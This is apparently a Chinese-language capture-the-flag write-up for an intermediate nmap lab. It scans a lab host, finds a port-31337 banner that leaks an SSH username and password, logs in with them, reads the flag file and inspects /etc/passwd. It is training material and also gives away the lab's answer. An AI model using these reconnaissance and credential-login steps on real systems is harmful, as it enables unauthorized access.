# intermediatenmap
```
nmap -sV 10.10.91.150
```



```
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
2222/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
31337/tcp open  Elite?

```
**其中 31337 端口未知服務
以下未知制banner**
```
SF-Port31337-TCP:V=7.92%I=7%D=1/1%Time=6592A96D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str
SF:0ng\n\n")%r(GetRequest,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\
SF:nubuntu:Dafdas!!/str0ng\n\n")%r(SIPOptions,35,"In\x20case\x20I\x20forge
SF:t\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(GenericLines,35,"In
SF:\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")
SF:%r(HTTPOptions,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:
SF:Dafdas!!/str0ng\n\n")%r(RTSPRequest,35,"In\x20case\x20I\x20forget\x20-\
SF:x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(RPCCheck,35,"In\x20case\x2
SF:0I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(DNSVersi
SF:onBindReqTCP,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Da
SF:fdas!!/str0ng\n\n")%r(DNSStatusRequestTCP,35,"In\x20case\x20I\x20forget
SF:\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(Help,35,"In\x20case\
SF:x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(SSLSes
SF:sionReq,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!
SF:!/str0ng\n\n")%r(TerminalServerCookie,35,"In\x20case\x20I\x20forget\x20
SF:-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(TLSSessionReq,35,"In\x20
SF:case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(K
SF:erberos,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!
SF:!/str0ng\n\n")%r(SMBProgNeg,35,"In\x20case\x20I\x20forget\x20-\x20user:
SF:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(X11Probe,35,"In\x20case\x20I\x20fo
SF:rget\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(FourOhFourReques
SF:t,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str0
SF:ng\n\n")%r(LPDString,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nu
SF:buntu:Dafdas!!/str0ng\n\n")%r(LDAPSearchReq,35,"In\x20case\x20I\x20forg
SF:et\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")%r(LDAPBindReq,35,"In
SF:\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n")
SF:%r(LANDesk-RC,35,"In\x20case\x20I\x20forget\x20-\x20user:pass\nubuntu:D
SF:afdas!!/str0ng\n\n")%r(TerminalServer,35,"In\x20case\x20I\x20forget\x20
SF:-\x20user:pass\nubuntu:Dafdas!!/str0ng\n\n");

```


**其中可以看到很多**
```
user:pass\nubuntu:Dafdas!!/str0ng
```


**我們使用netcat 連接**
```
nc 10.10.91.150 31337

In case I forget - user:pass
ubuntu:Dafdas!!/str0ng

```

```
ssh user@10.10.91.150
ssh ubuntu@10.10.91.150 (這可登入)

ssh user@10.10.91.150 -p 2222
ssh ubuntu@10.10.91.150 -p 2222
```



**其他人有r權限**
```
ubuntu@f518fa10296d:/home/user$ ls -al
total 16
drwxr-xr-x 2 root root 4096 Mar  2  2022 .
drwxr-xr-x 1 root root 4096 Mar  2  2022 ..
-rw-rw-r-- 1 root root   38 Mar  2  2022 flag.txt
```



```
cat /home/user/flag.txt
flag{251f309497a18888dde5222761ea88e4}
```






























此VM 10.10.248.3 正在偵聽高端口，如果您連接到它，它可能會為您提供一些信息，您可以使用這些信息連接到通常用於遠端訪問的較低端口！



nmap -sS  -T4 10.10.248.3

或
nmap -sS -p- -T4 10.10.248.3 (很慢)

-p- 是全端口
-T4 (Aggressive): 較快的速度，適合快速掃描。



22/tcp    open  ssh
2222/tcp  open  EtherNetIP-1
31337/tcp open  Elite




----------------------------------------------------------------------
如果该端口运行的是一个服务，通常会返回一个 "banner"。Banner 是服务在连接时发送的一小段信息，通常包含服务的名称、版本信息等。





nmap -sV  10.10.248.3 -p 31337













用netcat 連接

nc 10.10.248.3 31337



找到banner 很像密碼
In case I forget - 

user:pass

ubuntu:Dafdas!!/str0ng




--------------------------------------------------------------------
不能登入
ssh user@10.10.248.3   




可以登入
ssh ubuntu@10.10.248.3 

--------------------------------------------------------------------




ls -al



cat /home/user/flag.txt


flag{251f309497a18888dde5222761ea88e4}$ 


發現:
cat /etc/passwd 發現沒有user  但卻有 /home/user 大概慮是被刪除了

--------------------------------------------------------------------